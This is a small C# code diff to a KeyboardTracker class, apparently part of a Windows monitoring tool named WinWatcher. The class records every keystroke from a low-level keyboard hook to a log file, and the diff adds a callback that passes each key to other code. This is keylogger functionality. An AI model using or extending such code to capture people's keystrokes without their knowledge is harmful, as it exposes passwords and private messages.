@@ -9,10 +9,11 @@ namespace WinWatcher.Entities
     {
         private string logPath;
         private IntPtr hookId = IntPtr.Zero;
-
-        public KeyboardTracker(string path)
+        private Action<string> onKeyPressed;
+        public KeyboardTracker(string path, Action<string> keyCallback)
         {
             logPath = path;
+            onKeyPressed = keyCallback;
         }
 
         public void Start()
@@ -45,6 +46,7 @@ namespace WinWatcher.Entities
                 string key = ((Keys)vkCode).ToString();
 
                 File.AppendAllText(logPath, key + " ");
+                onKeyPressed?.Invoke(key);
             }
 
             return CallNextHookEx(hookId, nCode, wParam, lParam);
